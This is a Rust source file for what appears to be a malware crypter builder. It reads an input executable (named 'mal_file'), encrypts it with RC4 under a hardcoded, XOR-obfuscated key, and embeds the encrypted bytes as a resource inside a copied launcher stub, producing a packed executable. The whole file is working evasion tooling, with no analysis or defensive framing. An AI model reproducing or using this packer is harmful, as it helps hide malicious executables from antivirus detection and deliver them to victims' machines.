use std::ffi::CString;
use std::fs::{self, File};
use std::io::{self, Read};
use std::ptr;
use std::env;
use winapi::um::winnt::SUBLANG_NEUTRAL;
use winapi::um::winnt::LANG_NEUTRAL;
use winapi::um::winbase::{BeginUpdateResourceA, EndUpdateResourceA, UpdateResourceA};
use winapi::um::winnt::MAKELANGID;
use winapi::um::memoryapi::{VirtualAlloc, VirtualFree};
use winapi::um::winnt::{MEM_COMMIT, MEM_RELEASE, MEM_RESERVE, PAGE_READWRITE};

#[macro_export]
macro_rules! MAKEINTRESOURCEA {
    ($i:expr) => {
        ($i as usize) as *const i8
    }
}

struct Rc4 {
    s: [u8; 256],
    i: usize,
    j: usize,
}

impl Rc4 {
    fn new(key: &[u8]) -> Rc4 {
        let mut s = [0u8; 256];
        for i in 0..256 {
            s[i] = i as u8;
        }

        let mut j = 0;
        for i in 0..256 {
            j = (j + s[i] as usize + key[i % key.len()] as usize) % 256;
            s.swap(i, j);
        }
        Rc4 { s, i: 0, j: 0 }
    }

    fn apply_keystream(&mut self, data: &mut [u8]) {
        for byte in data.iter_mut() {
            self.i = (self.i + 1) % 256;
            self.j = (self.j + self.s[self.i] as usize) % 256;
            self.s.swap(self.i, self.j);
            let t = (self.s[self.i] as usize + self.s[self.j] as usize) % 256;
            *byte ^= self.s[t];
        }
    }
}

fn main() -> io::Result<()> {
    let args: Vec<String> = env::args().collect();
    
    if args.len() != 3 {
        eprintln!("Usage: {} <input_pe_file> <launcher_file>", args[0]);
        return Ok(());
    }

    let mal_file = &args[1];
    let stub_file = &args[2];
    let out_file = format!("{}_packed.exe", stub_file.trim_end_matches(".exe"));

    if !std::path::Path::new(mal_file).exists() {
        eprintln!("Input file does not exist!");
        return Ok(());
    }

    let mut file = File::open(mal_file)?;
    let metadata = file.metadata()?;
    let dw_resource_size = metadata.len() as usize;

    if dw_resource_size == 0 {
        eprintln!("File size is zero.");
        return Ok(());
    }

    let lp_resource_buffer = unsafe {
        VirtualAlloc(ptr::null_mut(), dw_resource_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE)
    };

    if lp_resource_buffer.is_null() {
        eprintln!("Failed to allocate memory.");
        return Ok(());
    }

    let mut buffer = vec![0u8; dw_resource_size];
    file.read_exact(&mut buffer)?;

    unsafe {
        ptr::copy_nonoverlapping(buffer.as_ptr(), lp_resource_buffer as *mut u8, dw_resource_size);
    }

    if !std::path::Path::new(stub_file).exists() {
        eprintln!("launcher file does not exist!");
        unsafe { VirtualFree(lp_resource_buffer, 0, MEM_RELEASE) };
        return Ok(());
    }

    match fs::copy(stub_file, &out_file) {
        Ok(_) => println!("Successfully created output file"),
        Err(e) => {
            eprintln!("Error creating output file: {}", e);
            unsafe { VirtualFree(lp_resource_buffer, 0, MEM_RELEASE) };
            return Ok(());
        }
    }

    let mut key: [u8; 30] = [
        0x55,0x6d,0x63,0x23,0x21,0x7b,0x58,0x79,0x21,0x70,0x79,0x63,0x41,0x7f,0x76,0x73,0x69,0x64,
        0x3e,0x63,0x74,0x72,0x3c,0x7c,0x65,0x6e,0x1a,0x7e,0x64,0x7c,
    ];
    let mut j = 1;
    for i in 0..30 {
        if i % 2 == 0 {
            key[i] = key[i] + j;
        } else {
            j = j + 1;
        }
        key[i] = key[i] ^ 0x17;
    }

    // Encrypt the buffer
    let mut rc4 = Rc4::new(&key);
    rc4.apply_keystream(&mut buffer);
    
    unsafe {
        ptr::copy_nonoverlapping(buffer.as_ptr(), lp_resource_buffer as *mut u8, dw_resource_size);
    }
    
    let out_file_c = CString::new(out_file.clone()).unwrap();
    let h_update = unsafe { BeginUpdateResourceA(out_file_c.as_ptr(), 0) };

    if h_update.is_null() {
        eprintln!("Resource update initialization failed.");
        unsafe { VirtualFree(lp_resource_buffer, 0, MEM_RELEASE) };
        return Ok(());
    }

    let lang_id = MAKELANGID(LANG_NEUTRAL, SUBLANG_NEUTRAL);

    let update_result = unsafe {
        UpdateResourceA(
            h_update,
            CString::new("STUB").unwrap().as_ptr(),
            MAKEINTRESOURCEA!(69),
            lang_id as u16,
            lp_resource_buffer,
            dw_resource_size as u32,
        )
    };

    if update_result == 0 {
        unsafe {
            VirtualFree(lp_resource_buffer, 0, MEM_RELEASE);
            EndUpdateResourceA(h_update, 1);
        }
        eprintln!("Resource update failed.");
        return Ok(());
    }

    let end_result = unsafe { EndUpdateResourceA(h_update, 0) };

    if end_result == 0 {
        eprintln!("Finalizing resource update failed.");
        unsafe { VirtualFree(lp_resource_buffer, 0, MEM_RELEASE) };
        return Ok(());
    }

    unsafe { VirtualFree(lp_resource_buffer, 0, MEM_RELEASE) };
    println!("Operation completed successfully!");
    Ok(())
}